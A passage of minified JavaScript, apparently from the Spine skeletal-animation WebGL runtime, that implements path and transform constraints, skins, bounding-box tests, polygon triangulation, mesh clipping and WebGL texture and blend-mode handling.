t=6*r;for(b=h[t],x=h[t+1],w=h[t+2],y=h[t+3],v=h[t+4],A=h[t+5],C=h[t+6],S=h[t+7],k=.03*(b-2*w+v),E=.03*(x-2*y+A),Y=.006*(3*(w-v)-b+C),M=.006*(3*(y-A)-x+S),T=2*k+Y,I=2*E+M,X=.3*(w-b)+k+.16666667*Y,R=.3*(y-x)+E+.16666667*M,P=Math.sqrt(X*X+R*R),L[0]=P,t=1;t<8;t++)X+=T,R+=I,T+=Y,I+=M,P+=Math.sqrt(X*X+R*R),L[t]=P;X+=T,R+=I,P+=Math.sqrt(X*X+R*R),L[8]=P,X+=T+Y,R+=I+M,P+=Math.sqrt(X*X+R*R),L[9]=P,a=0}for(u*=P;;a++){let t=L[a];if(!(u>t)){if(0==a)u/=t;else{let e=L[a-1];u=a+(u-e)/(t-e)}break}}this.addCurvePosition(.1*u,b,x,w,y,v,A,C,S,l,e,i||t>0&&0==s)}return l}addBeforePosition(t,e,s,i,r){let n=e[s],a=e[s+1],o=e[s+2]-n,l=e[s+3]-a,h=Math.atan2(l,o);i[r]=n+t*Math.cos(h),i[r+1]=a+t*Math.sin(h),i[r+2]=h}addAfterPosition(t,e,s,i,r){let n=e[s+2],a=e[s+3],o=n-e[s],l=a-e[s+1],h=Math.atan2(l,o);i[r]=n+t*Math.cos(h),i[r+1]=a+t*Math.sin(h),i[r+2]=h}addCurvePosition(t,e,s,i,r,n,a,o,l,h,c,d){if(0==t||isNaN(t))return h[c]=e,h[c+1]=s,void(h[c+2]=Math.atan2(r-s,i-e));let u=t*t,m=u*t,f=1-t,g=f*f,p=g*f,b=f*t,x=3*b,w=f*x,y=x*t,v=e*p+i*w+n*y+o*m,A=s*p+r*w+a*y+l*m;h[c]=v,h[c+1]=A,d&&(h[c+2]=t<.001?Math.atan2(r-s,i-e):Math.atan2(A-(s*g+r*b*2+a*u),v-(e*g+i*b*2+n*u)))}}Tt.NONE=-1,Tt.BEFORE=-2,Tt.AFTER=-3,Tt.epsilon=1e-5;class It{constructor(t,e){if(this.darkColor=null,this.attachment=null,this.attachmentState=0,this.sequenceIndex=-1,this.deform=new Array,!t)throw new Error("data cannot be null.");if(!e)throw new Error("bone cannot be null.");this.data=t,this.bone=e,this.color=new r,this.darkColor=t.darkColor?new r:null,this.setToSetupPose()}getSkeleton(){return this.bone.skeleton}getAttachment(){return this.attachment}setAttachment(t){this.attachment!=t&&(t instanceof c&&this.attachment instanceof c&&t.timelineAttahment==this.attachment.timelineAttahment||(this.deform.length=0),this.attachment=t,this.sequenceIndex=-1)}setToSetupPose(){this.color.setFromColor(this.data.color),this.darkColor&&this.darkColor.setFromColor(this.data.darkColor),this.data.attachmentName?(this.attachment=null,this.setAttachment(this.bone.skeleton.getAttachment(this.data.index,this.data.attachmentName))):this.attachment=null}}class Xt{constructor(t,e){if(this.mixRotate=0,this.mixX=0,this.mixY=0,this.mixScaleX=0,this.mixScaleY=0,this.mixShearY=0,this.temp=new l,this.active=!1,!t)throw new Error("data cannot be null.");if(!e)throw new Error("skeleton cannot be null.");this.data=t,this.mixRotate=t.mixRotate,this.mixX=t.mixX,this.mixY=t.mixY,this.mixScaleX=t.mixScaleX,this.mixScaleY=t.mixScaleY,this.mixShearY=t.mixShearY,this.bones=new Array;for(let s=0;s<t.bones.length;s++){let i=e.findBone(t.bones[s].name);if(!i)throw new Error(`Couldn't find bone ${t.bones[s].name}.`);this.bones.push(i)}let s=e.findBone(t.target.name);if(!s)throw new Error(`Couldn't find target bone ${t.target.name}.`);this.target=s}isActive(){return this.active}update(){0==this.mixRotate&&0==this.mixX&&0==this.mixY&&0==this.mixScaleX&&0==this.mixScaleX&&0==this.mixShearY||(this.data.local?this.data.relative?this.applyRelativeLocal():this.applyAbsoluteLocal():this.data.relative?this.applyRelativeWorld():this.applyAbsoluteWorld())}applyAbsoluteWorld(){let t=this.mixRotate,e=this.mixX,s=this.mixY,i=this.mixScaleX,r=this.mixScaleY,a=this.mixShearY,o=0!=e||0!=s,l=this.target,h=l.a,c=l.b,d=l.c,u=l.d,m=h*u-c*d>0?n.degRad:-n.degRad,f=this.data.offsetRotation*m,g=this.data.offsetShearY*m,p=this.bones;for(let m=0,b=p.length;m<b;m++){let b=p[m];if(0!=t){let e=b.a,s=b.b,i=b.c,r=b.d,a=Math.atan2(d,h)-Math.atan2(i,e)+f;a>n.PI?a-=n.PI2:a<-n.PI&&(a+=n.PI2),a*=t;let o=Math.cos(a),l=Math.sin(a);b.a=o*e-l*i,b.b=o*s-l*r,b.c=l*e+o*i,b.d=l*s+o*r}if(o){let t=this.temp;l.localToWorld(t.set(this.data.offsetX,this.data.offsetY)),b.worldX+=(t.x-b.worldX)*e,b.worldY+=(t.y-b.worldY)*s}if(0!=i){let t=Math.sqrt(b.a*b.a+b.c*b.c);0!=t&&(t=(t+(Math.sqrt(h*h+d*d)-t+this.data.offsetScaleX)*i)/t),b.a*=t,b.c*=t}if(0!=r){let t=Math.sqrt(b.b*b.b+b.d*b.d);0!=t&&(t=(t+(Math.sqrt(c*c+u*u)-t+this.data.offsetScaleY)*r)/t),b.b*=t,b.d*=t}if(a>0){let t=b.b,e=b.d,s=Math.atan2(e,t),i=Math.atan2(u,c)-Math.atan2(d,h)-(s-Math.atan2(b.c,b.a));i>n.PI?i-=n.PI2:i<-n.PI&&(i+=n.PI2),i=s+(i+g)*a;let r=Math.sqrt(t*t+e*e);b.b=Math.cos(i)*r,b.d=Math.sin(i)*r}b.updateAppliedTransform()}}applyRelativeWorld(){let t=this.mixRotate,e=this.mixX,s=this.mixY,i=this.mixScaleX,r=this.mixScaleY,a=this.mixShearY,o=0!=e||0!=s,l=this.target,h=l.a,c=l.b,d=l.c,u=l.d,m=h*u-c*d>0?n.degRad:-n.degRad,f=this.data.offsetRotation*m,g=this.data.offsetShearY*m,p=this.bones;for(let m=0,b=p.length;m<b;m++){let b=p[m];if(0!=t){let e=b.a,s=b.b,i=b.c,r=b.d,a=Math.atan2(d,h)+f;a>n.PI?a-=n.PI2:a<-n.PI&&(a+=n.PI2),a*=t;let o=Math.cos(a),l=Math.sin(a);b.a=o*e-l*i,b.b=o*s-l*r,b.c=l*e+o*i,b.d=l*s+o*r}if(o){let t=this.temp;l.localToWorld(t.set(this.data.offsetX,this.data.offsetY)),b.worldX+=t.x*e,b.worldY+=t.y*s}if(0!=i){let t=(Math.sqrt(h*h+d*d)-1+this.data.offsetScaleX)*i+1;b.a*=t,b.c*=t}if(0!=r){let t=(Math.sqrt(c*c+u*u)-1+this.data.offsetScaleY)*r+1;b.b*=t,b.d*=t}if(a>0){let t=Math.atan2(u,c)-Math.atan2(d,h);t>n.PI?t-=n.PI2:t<-n.PI&&(t+=n.PI2);let e=b.b,s=b.d;t=Math.atan2(s,e)+(t-n.PI/2+g)*a;let i=Math.sqrt(e*e+s*s);b.b=Math.cos(t)*i,b.d=Math.sin(t)*i}b.updateAppliedTransform()}}applyAbsoluteLocal(){let t=this.mixRotate,e=this.mixX,s=this.mixY,i=this.mixScaleX,r=this.mixScaleY,n=this.mixShearY,a=this.target,o=this.bones;for(let l=0,h=o.length;l<h;l++){let h=o[l],c=h.arotation;if(0!=t){let e=a.arotation-c+this.data.offsetRotation;e-=360*(16384-(16384.499999999996-e/360|0)),c+=e*t}let d=h.ax,u=h.ay;d+=(a.ax-d+this.data.offsetX)*e,u+=(a.ay-u+this.data.offsetY)*s;let m=h.ascaleX,f=h.ascaleY;0!=i&&0!=m&&(m=(m+(a.ascaleX-m+this.data.offsetScaleX)*i)/m),0!=r&&0!=f&&(f=(f+(a.ascaleY-f+this.data.offsetScaleY)*r)/f);let g=h.ashearY;if(0!=n){let t=a.ashearY-g+this.data.offsetShearY;t-=360*(16384-(16384.499999999996-t/360|0)),g+=t*n}h.updateWorldTransformWith(d,u,c,m,f,h.ashearX,g)}}applyRelativeLocal(){let t=this.mixRotate,e=this.mixX,s=this.mixY,i=this.mixScaleX,r=this.mixScaleY,n=this.mixShearY,a=this.target,o=this.bones;for(let l=0,h=o.length;l<h;l++){let h=o[l],c=h.arotation+(a.arotation+this.data.offsetRotation)*t,d=h.ax+(a.ax+this.data.offsetX)*e,u=h.ay+(a.ay+this.data.offsetY)*s,m=h.ascaleX*((a.ascaleX-1+this.data.offsetScaleX)*i+1),f=h.ascaleY*((a.ascaleY-1+this.data.offsetScaleY)*r+1),g=h.ashearY+(a.ashearY+this.data.offsetShearY)*n;h.updateWorldTransformWith(d,u,c,m,f,h.ashearX,g)}}}class Rt{constructor(){this.name=null,this.bones=new Array,this.slots=new Array,this.skins=new Array,this.defaultSkin=null,this.events=new Array,this.animations=new Array,this.ikConstraints=new Array,this.transformConstraints=new Array,this.pathConstraints=new Array,this.x=0,this.y=0,this.width=0,this.height=0,this.version=null,this.hash=null,this.fps=0,this.imagesPath=null,this.audioPath=null}findBone(t){if(!t)throw new Error("boneName cannot be null.");let e=this.bones;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findSlot(t){if(!t)throw new Error("slotName cannot be null.");let e=this.slots;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findSkin(t){if(!t)throw new Error("skinName cannot be null.");let e=this.skins;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findEvent(t){if(!t)throw new Error("eventDataName cannot be null.");let e=this.events;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findAnimation(t){if(!t)throw new Error("animationName cannot be null.");let e=this.animations;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findIkConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.ikConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findTransformConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.transformConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}findPathConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.pathConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.name==t)return i}return null}}class Lt{constructor(t=0,e,s){this.slotIndex=t,this.name=e,this.attachment=s}}class Pt{constructor(t){if(this.attachments=new Array,this.bones=Array(),this.constraints=new Array,!t)throw new Error("name cannot be null.");this.name=t}setAttachment(t,e,s){if(!s)throw new Error("attachment cannot be null.");let i=this.attachments;t>=i.length&&(i.length=t+1),i[t]||(i[t]={}),i[t][e]=s}addSkin(t){for(let e=0;e<t.bones.length;e++){let s=t.bones[e],i=!1;for(let t=0;t<this.bones.length;t++)if(this.bones[t]==s){i=!0;break}i||this.bones.push(s)}for(let e=0;e<t.constraints.length;e++){let s=t.constraints[e],i=!1;for(let t=0;t<this.constraints.length;t++)if(this.constraints[t]==s){i=!0;break}i||this.constraints.push(s)}let e=t.getAttachments();for(let t=0;t<e.length;t++){var s=e[t];this.setAttachment(s.slotIndex,s.name,s.attachment)}}copySkin(t){for(let e=0;e<t.bones.length;e++){let s=t.bones[e],i=!1;for(let t=0;t<this.bones.length;t++)if(this.bones[t]==s){i=!0;break}i||this.bones.push(s)}for(let e=0;e<t.constraints.length;e++){let s=t.constraints[e],i=!1;for(let t=0;t<this.constraints.length;t++)if(this.constraints[t]==s){i=!0;break}i||this.constraints.push(s)}let e=t.getAttachments();for(let t=0;t<e.length;t++){var s=e[t];s.attachment&&(s.attachment instanceof pt?(s.attachment=s.attachment.newLinkedMesh(),this.setAttachment(s.slotIndex,s.name,s.attachment)):(s.attachment=s.attachment.copy(),this.setAttachment(s.slotIndex,s.name,s.attachment)))}}getAttachment(t,e){let s=this.attachments[t];return s?s[e]:null}removeAttachment(t,e){let s=this.attachments[t];s&&delete s[e]}getAttachments(){let t=new Array;for(var e=0;e<this.attachments.length;e++){let s=this.attachments[e];if(s)for(let i in s){let r=s[i];r&&t.push(new Lt(e,i,r))}}return t}getAttachmentsForSlot(t,e){let s=this.attachments[t];if(s)for(let i in s){let r=s[i];r&&e.push(new Lt(t,i,r))}}clear(){this.attachments.length=0,this.bones.length=0,this.constraints.length=0}attachAll(t,e){let s=0;for(let i=0;i<t.slots.length;i++){let r=t.slots[i],n=r.getAttachment();if(n&&s<e.attachments.length){let t=e.attachments[s];for(let e in t)if(n==t[e]){let t=this.getAttachment(s,e);t&&r.setAttachment(t);break}}s++}}}class qt{constructor(t,s,i){if(this.index=0,this.color=new r(1,1,1,1),this.darkColor=null,this.attachmentName=null,this.blendMode=e.bt.Normal,t<0)throw new Error("index must be >= 0.");if(!s)throw new Error("name cannot be null.");if(!i)throw new Error("boneData cannot be null.");this.index=t,this.name=s,this.boneData=i}}e.bt=void 0,(ct=e.bt||(e.bt={}))[ct.Normal=0]="Normal",ct[ct.Additive=1]="Additive",ct[ct.Multiply=2]="Multiply",ct[ct.Screen=3]="Screen";class Ft extends At{constructor(t){super(t,0,!1),this.bones=new Array,this._target=null,this.mixRotate=0,this.mixX=0,this.mixY=0,this.mixScaleX=0,this.mixScaleY=0,this.mixShearY=0,this.offsetRotation=0,this.offsetX=0,this.offsetY=0,this.offsetScaleX=0,this.offsetScaleY=0,this.offsetShearY=0,this.relative=!1,this.local=!1}set target(t){this._target=t}get target(){if(this._target)return this._target;throw new Error("BoneData not set.")}}!function(t){t[t.Region=0]="Region",t[t.BoundingBox=1]="BoundingBox",t[t.Mesh=2]="Mesh",t[t.LinkedMesh=3]="LinkedMesh",t[t.Path=4]="Path",t[t.Point=5]="Point",t[t.Clipping=6]="Clipping"}(dt||(dt={}));class Dt{constructor(){this.minX=0,this.minY=0,this.maxX=0,this.maxY=0,this.boundingBoxes=new Array,this.polygons=new Array,this.polygonPool=new o((()=>a.newFloatArray(16)))}update(t,e){if(!t)throw new Error("skeleton cannot be null.");let s=this.boundingBoxes,i=this.polygons,r=this.polygonPool,n=t.slots,o=n.length;s.length=0,r.freeAll(i),i.length=0;for(let t=0;t<o;t++){let e=n[t];if(!e.bone.active)continue;let o=e.getAttachment();if(o instanceof st){let t=o;s.push(t);let n=r.obtain();n.length!=t.worldVerticesLength&&(n=a.newFloatArray(t.worldVerticesLength)),i.push(n),t.computeWorldVertices(e,0,t.worldVerticesLength,n,0,2)}}e?this.aabbCompute():(this.minX=Number.POSITIVE_INFINITY,this.minY=Number.POSITIVE_INFINITY,this.maxX=Number.NEGATIVE_INFINITY,this.maxY=Number.NEGATIVE_INFINITY)}aabbCompute(){let t=Number.POSITIVE_INFINITY,e=Number.POSITIVE_INFINITY,s=Number.NEGATIVE_INFINITY,i=Number.NEGATIVE_INFINITY,r=this.polygons;for(let n=0,a=r.length;n<a;n++){let a=r[n],o=a;for(let r=0,n=a.length;r<n;r+=2){let n=o[r],a=o[r+1];t=Math.min(t,n),e=Math.min(e,a),s=Math.max(s,n),i=Math.max(i,a)}}this.minX=t,this.minY=e,this.maxX=s,this.maxY=i}aabbContainsPoint(t,e){return t>=this.minX&&t<=this.maxX&&e>=this.minY&&e<=this.maxY}aabbIntersectsSegment(t,e,s,i){let r=this.minX,n=this.minY,a=this.maxX,o=this.maxY;if(t<=r&&s<=r||e<=n&&i<=n||t>=a&&s>=a||e>=o&&i>=o)return!1;let l=(i-e)/(s-t),h=l*(r-t)+e;if(h>n&&h<o)return!0;if(h=l*(a-t)+e,h>n&&h<o)return!0;let c=(n-e)/l+t;return c>r&&c<a||(c=(o-e)/l+t,c>r&&c<a)}aabbIntersectsSkeleton(t){return this.minX<t.maxX&&this.maxX>t.minX&&this.minY<t.maxY&&this.maxY>t.minY}containsPoint(t,e){let s=this.polygons;for(let i=0,r=s.length;i<r;i++)if(this.containsPointPolygon(s[i],t,e))return this.boundingBoxes[i];return null}containsPointPolygon(t,e,s){let i=t,r=t.length,n=r-2,a=!1;for(let t=0;t<r;t+=2){let r=i[t+1],o=i[n+1];if(r<s&&o>=s||o<s&&r>=s){let l=i[t];l+(s-r)/(o-r)*(i[n]-l)<e&&(a=!a)}n=t}return a}intersectsSegment(t,e,s,i){let r=this.polygons;for(let n=0,a=r.length;n<a;n++)if(this.intersectsSegmentPolygon(r[n],t,e,s,i))return this.boundingBoxes[n];return null}intersectsSegmentPolygon(t,e,s,i,r){let n=t,a=t.length,o=e-i,l=s-r,h=e*r-s*i,c=n[a-2],d=n[a-1];for(let t=0;t<a;t+=2){let a=n[t],u=n[t+1],m=c*u-d*a,f=c-a,g=d-u,p=o*g-l*f,b=(h*f-o*m)/p;if((b>=c&&b<=a||b>=a&&b<=c)&&(b>=e&&b<=i||b>=i&&b<=e)){let t=(h*g-l*m)/p;if((t>=d&&t<=u||t>=u&&t<=d)&&(t>=s&&t<=r||t>=r&&t<=s))return!0}c=a,d=u}return!1}getPolygon(t){if(!t)throw new Error("boundingBox cannot be null.");let e=this.boundingBoxes.indexOf(t);return-1==e?null:this.polygons[e]}getWidth(){return this.maxX-this.minX}getHeight(){return this.maxY-this.minY}}class Bt{constructor(){this.convexPolygons=new Array,this.convexPolygonsIndices=new Array,this.indicesArray=new Array,this.isConcaveArray=new Array,this.triangles=new Array,this.polygonPool=new o((()=>new Array)),this.polygonIndicesPool=new o((()=>new Array))}triangulate(t){let e=t,s=t.length>>1,i=this.indicesArray;i.length=0;for(let t=0;t<s;t++)i[t]=t;let r=this.isConcaveArray;r.length=0;for(let t=0,n=s;t<n;++t)r[t]=Bt.isConcave(t,s,e,i);let n=this.triangles;for(n.length=0;s>3;){let t=s-1,a=0,o=1;for(;;){t:if(!r[a]){let n=i[t]<<1,l=i[a]<<1,h=i[o]<<1,c=e[n],d=e[n+1],u=e[l],m=e[l+1],f=e[h],g=e[h+1];for(let n=(o+1)%s;n!=t;n=(n+1)%s){if(!r[n])continue;let t=i[n]<<1,s=e[t],a=e[t+1];if(Bt.positiveArea(f,g,c,d,s,a)&&Bt.positiveArea(c,d,u,m,s,a)&&Bt.positiveArea(u,m,f,g,s,a))break t}break}if(0==o){do{if(!r[a])break;a--}while(a>0);break}t=a,a=o,o=(o+1)%s}n.push(i[(s+a-1)%s]),n.push(i[a]),n.push(i[(a+1)%s]),i.splice(a,1),r.splice(a,1),s--;let l=(s+a-1)%s,h=a==s?0:a;r[l]=Bt.isConcave(l,s,e,i),r[h]=Bt.isConcave(h,s,e,i)}return 3==s&&(n.push(i[2]),n.push(i[0]),n.push(i[1])),n}decompose(t,e){let s=t,i=this.convexPolygons;this.polygonPool.freeAll(i),i.length=0;let r=this.convexPolygonsIndices;this.polygonIndicesPool.freeAll(r),r.length=0;let n=this.polygonIndicesPool.obtain();n.length=0;let a=this.polygonPool.obtain();a.length=0;let o=-1,l=0;for(let t=0,h=e.length;t<h;t+=3){let h=e[t]<<1,c=e[t+1]<<1,d=e[t+2]<<1,u=s[h],m=s[h+1],f=s[c],g=s[c+1],p=s[d],b=s[d+1],x=!1;if(o==h){let t=a.length-4,e=Bt.winding(a[t],a[t+1],a[t+2],a[t+3],p,b),s=Bt.winding(p,b,a[0],a[1],a[2],a[3]);e==l&&s==l&&(a.push(p),a.push(b),n.push(d),x=!0)}x||(a.length>0?(i.push(a),r.push(n)):(this.polygonPool.free(a),this.polygonIndicesPool.free(n)),a=this.polygonPool.obtain(),a.length=0,a.push(u),a.push(m),a.push(f),a.push(g),a.push(p),a.push(b),n=this.polygonIndicesPool.obtain(),n.length=0,n.push(h),n.push(c),n.push(d),l=Bt.winding(u,m,f,g,p,b),o=h)}a.length>0&&(i.push(a),r.push(n));for(let t=0,e=i.length;t<e;t++){if(n=r[t],0==n.length)continue;let s=n[0],o=n[n.length-1];a=i[t];let l=a.length-4,h=a[l],c=a[l+1],d=a[l+2],u=a[l+3],m=a[0],f=a[1],g=a[2],p=a[3],b=Bt.winding(h,c,d,u,m,f);for(let l=0;l<e;l++){if(l==t)continue;let e=r[l];if(3!=e.length)continue;let x=e[0],w=e[1],y=e[2],v=i[l],A=v[v.length-2],C=v[v.length-1];if(x!=s||w!=o)continue;let S=Bt.winding(h,c,d,u,A,C),k=Bt.winding(A,C,m,f,g,p);S==b&&k==b&&(v.length=0,e.length=0,a.push(A),a.push(C),n.push(y),h=d,c=u,d=A,u=C,l=0)}}for(let t=i.length-1;t>=0;t--)a=i[t],0==a.length&&(i.splice(t,1),this.polygonPool.free(a),n=r[t],r.splice(t,1),this.polygonIndicesPool.free(n));return i}static isConcave(t,e,s,i){let r=i[(e+t-1)%e]<<1,n=i[t]<<1,a=i[(t+1)%e]<<1;return!this.positiveArea(s[r],s[r+1],s[n],s[n+1],s[a],s[a+1])}static positiveArea(t,e,s,i,r,n){return t*(n-i)+s*(e-n)+r*(i-e)>=0}static winding(t,e,s,i,r,n){let a=s-t,o=i-e;return r*o-n*a+a*e-t*o>=0?1:-1}}class Vt{constructor(){this.triangulator=new Bt,this.clippingPolygon=new Array,this.clipOutput=new Array,this.clippedVertices=new Array,this.clippedTriangles=new Array,this.scratch=new Array,this.clipAttachment=null,this.clippingPolygons=null}clipStart(t,e){if(this.clipAttachment)return 0;this.clipAttachment=e;let s=e.worldVerticesLength,i=a.setArraySize(this.clippingPolygon,s);e.computeWorldVertices(t,0,s,i,0,2);let r=this.clippingPolygon;Vt.makeClockwise(r);let n=this.clippingPolygons=this.triangulator.decompose(r,this.triangulator.triangulate(r));for(let t=0,e=n.length;t<e;t++){let e=n[t];Vt.makeClockwise(e),e.push(e[0]),e.push(e[1])}return n.length}clipEndWithSlot(t){this.clipAttachment&&this.clipAttachment.endSlot==t.data&&this.clipEnd()}clipEnd(){this.clipAttachment&&(this.clipAttachment=null,this.clippingPolygons=null,this.clippedVertices.length=0,this.clippedTriangles.length=0,this.clippingPolygon.length=0)}isClipping(){return null!=this.clipAttachment}clipTriangles(t,e,s,i,r,n,o,l){let h=this.clipOutput,c=this.clippedVertices,d=this.clippedTriangles,u=this.clippingPolygons,m=u.length,f=l?12:8,g=0;c.length=0,d.length=0;t:for(let e=0;e<i;e+=3){let i=s[e]<<1,p=t[i],b=t[i+1],x=r[i],w=r[i+1];i=s[e+1]<<1;let y=t[i],v=t[i+1],A=r[i],C=r[i+1];i=s[e+2]<<1;let S=t[i],k=t[i+1],E=r[i],Y=r[i+1];for(let t=0;t<m;t++){let e=c.length;if(!this.clip(p,b,y,v,S,k,u[t],h)){let t=a.setArraySize(c,e+3*f);t[e]=p,t[e+1]=b,t[e+2]=n.r,t[e+3]=n.g,t[e+4]=n.b,t[e+5]=n.a,l?(t[e+6]=x,t[e+7]=w,t[e+8]=o.r,t[e+9]=o.g,t[e+10]=o.b,t[e+11]=o.a,t[e+12]=y,t[e+13]=v,t[e+14]=n.r,t[e+15]=n.g,t[e+16]=n.b,t[e+17]=n.a,t[e+18]=A,t[e+19]=C,t[e+20]=o.r,t[e+21]=o.g,t[e+22]=o.b,t[e+23]=o.a,t[e+24]=S,t[e+25]=k,t[e+26]=n.r,t[e+27]=n.g,t[e+28]=n.b,t[e+29]=n.a,t[e+30]=E,t[e+31]=Y,t[e+32]=o.r,t[e+33]=o.g,t[e+34]=o.b,t[e+35]=o.a):(t[e+6]=x,t[e+7]=w,t[e+8]=y,t[e+9]=v,t[e+10]=n.r,t[e+11]=n.g,t[e+12]=n.b,t[e+13]=n.a,t[e+14]=A,t[e+15]=C,t[e+16]=S,t[e+17]=k,t[e+18]=n.r,t[e+19]=n.g,t[e+20]=n.b,t[e+21]=n.a,t[e+22]=E,t[e+23]=Y),e=d.length;let s=a.setArraySize(d,e+3);s[e]=g,s[e+1]=g+1,s[e+2]=g+2,g+=3;continue t}{let t=h.length;if(0==t)continue;let s=v-k,i=S-y,r=p-S,u=k-b,m=1/(s*r+i*(b-k)),M=t>>1,T=this.clipOutput,I=a.setArraySize(c,e+M*f);for(let a=0;a<t;a+=2){let t=T[a],h=T[a+1];I[e]=t,I[e+1]=h,I[e+2]=n.r,I[e+3]=n.g,I[e+4]=n.b,I[e+5]=n.a;let c=t-S,d=h-k,g=(s*c+i*d)*m,p=(u*c+r*d)*m,b=1-g-p;I[e+6]=x*g+A*p+E*b,I[e+7]=w*g+C*p+Y*b,l&&(I[e+8]=o.r,I[e+9]=o.g,I[e+10]=o.b,I[e+11]=o.a),e+=f}e=d.length;let X=a.setArraySize(d,e+3*(M-2));M--;for(let t=1;t<M;t++)X[e]=g,X[e+1]=g+t,X[e+2]=g+t+1,e+=3;g+=M+1}}}}clip(t,e,s,i,r,n,a,o){let l,h=o,c=!1;a.length%4>=2?(l=o,o=this.scratch):l=this.scratch,l.length=0,l.push(t),l.push(e),l.push(s),l.push(i),l.push(r),l.push(n),l.push(t),l.push(e),o.length=0;let d=a,u=a.length-4;for(let t=0;;t+=2){let e=d[t],s=d[t+1],i=d[t+2],r=d[t+3],n=e-i,a=s-r,m=l,f=l.length-2,g=o.length;for(let t=0;t<f;t+=2){let l=m[t],h=m[t+1],d=m[t+2],u=m[t+3],f=n*(u-r)-a*(d-i)>0;if(n*(h-r)-a*(l-i)>0){if(f){o.push(d),o.push(u);continue}let t=u-h,n=d-l,a=t*(i-e)-n*(r-s);if(Math.abs(a)>1e-6){let c=(n*(s-h)-t*(e-l))/a;o.push(e+(i-e)*c),o.push(s+(r-s)*c)}else o.push(e),o.push(s)}else if(f){let t=u-h,n=d-l,a=t*(i-e)-n*(r-s);if(Math.abs(a)>1e-6){let c=(n*(s-h)-t*(e-l))/a;o.push(e+(i-e)*c),o.push(s+(r-s)*c)}else o.push(e),o.push(s);o.push(d),o.push(u)}c=!0}if(g==o.length)return h.length=0,!0;if(o.push(o[0]),o.push(o[1]),t==u)break;let p=o;(o=l).length=0,l=p}if(h!=o){h.length=0;for(let t=0,e=o.length-2;t<e;t++)h[t]=o[t]}else h.length=h.length-2;return c}static makeClockwise(t){let e=t,s=t.length,i=e[s-2]*e[1]-e[0]*e[s-1],r=0,n=0,a=0,o=0;for(let t=0,l=s-3;t<l;t+=2)r=e[t],n=e[t+1],a=e[t+2],o=e[t+3],i+=r*o-a*n;if(!(i<0))for(let t=0,i=s-2,r=s>>1;t<r;t+=2){let s=e[t],r=e[t+1],n=i-t;e[t]=e[n],e[t+1]=e[n+1],e[n]=s,e[n+1]=r}}}class _t{constructor(t,e,s,i,r){this.mesh=t,this.skin=e,this.slotIndex=s,this.parent=i,this.inheritTimeline=r}}function Nt(t,e,s,i){let r=t[0],n=Ut(r,"time",0),a=Ut(r,"value",s)*i,o=0;for(let l=0;;l++){e.setFrame(l,n,a);let h=t[l+1];if(!h)return e.shrink(o),e;let c=Ut(h,"time",0),d=Ut(h,"value",s)*i;r.curve&&(o=Wt(r.curve,e,o,l,0,n,c,a,d,i)),n=c,a=d,r=h}}function Ot(t,e,s,i,r,n){let a=t[0],o=Ut(a,"time",0),l=Ut(a,s,r)*n,h=Ut(a,i,r)*n,c=0;for(let d=0;;d++){e.setFrame(d,o,l,h);let u=t[d+1];if(!u)return e.shrink(c),e;let m=Ut(u,"time",0),f=Ut(u,s,r)*n,g=Ut(u,i,r)*n,p=a.curve;p&&(c=Wt(p,e,c,d,0,o,m,l,f,n),c=Wt(p,e,c,d,1,o,m,h,g,n)),o=m,l=f,h=g,a=u}}function Wt(t,e,s,i,r,n,a,o,l,h){if("stepped"==t)return e.setStepped(i),s;let c=r<<2,d=t[c],u=t[c+1]*h,m=t[c+2],f=t[c+3]*h;return e.setBezier(s,i,r,n,o,d,u,m,f,a,l),s+1}function Ut(t,e,s){return void 0!==t[e]?t[e]:s}(()=>{var t;void 0===Math.fround&&(Math.fround=(t=new Float32Array(1),function(e){return t[0]=e,t[0]}))})();class zt{constructor(t,e={alpha:"true"}){if(this.restorables=new Array,t instanceof WebGLRenderingContext||"undefined"!=typeof WebGL2RenderingContext&&t instanceof WebGL2RenderingContext)this.gl=t,this.canvas=this.gl.canvas;else{let s=t;this.gl=s.getContext("webgl2",e)||s.getContext("webgl",e),this.canvas=s,s.addEventListener("webglcontextlost",(t=>{t&&t.preventDefault()})),s.addEventListener("webglcontextrestored",(t=>{for(let t=0,e=this.restorables.length;t<e;t++)this.restorables[t].restore()}))}}addRestorable(t){this.restorables.push(t)}removeRestorable(t){let e=this.restorables.indexOf(t);e>-1&&this.restorables.splice(e,1)}}class $t{static getDestGLBlendMode(t){switch(t){case e.bt.Normal:return 771;case e.bt.Additive:return 1;case e.bt.Multiply:case e.bt.Screen:return 771;default:throw new Error("Unknown blend mode: "+t)}}static getSourceColorGLBlendMode(t,s=!1){switch(t){case e.bt.Normal:case e.bt.Additive:return s?1:770;case e.bt.Multiply:return 774;case e.bt.Screen:return 1;default:throw new Error("Unknown blend mode: "+t)}}static getSourceAlphaGLBlendMode(t){switch(t){case e.bt.Normal:case e.bt.Additive:return 1;case e.bt.Multiply:return 771;case e.bt.Screen:return 769;default:throw new Error("Unknown blend mode: "+t)}}}class Gt extends class{constructor(t){this._image=t}getImage(){return this._image}}{constructor(t,e,s=!1){super(e),this.texture=null,this.boundUnit=0,this.useMipMaps=!1,this.context=t instanceof zt?t:new zt(t),this.useMipMaps=s,this.restore(),this.context.addRestorable(this)}setFilters(t,e){let s=this.context.gl;this.bind(),s.texParameteri(s.TEXTURE_2D,s.TEXTURE_MIN_FILTER,t),s.texParameteri(s.TEXTURE_2D,s.TEXTURE_MAG_FILTER,Gt.validateMagFilter(e))}static validateMagFilter(t){switch(t){case e.Qb.MipMap:case e.Qb.MipMapLinearLinear:case e.Qb.MipMapLinearNearest:case e.Qb.MipMapNearestLinear:case e.Qb.MipMapNearestNearest:return e.Qb.Linear;default:return t}}setWraps(t,e){let s=this.context.gl;this.bind(),s.texParameteri(s.TEXTURE_2D,s.TEXTURE_WRAP_S,t),s.texParameteri(s.TEXTURE_2D,s.TEXTURE_WRAP_T,e)}update(t){let 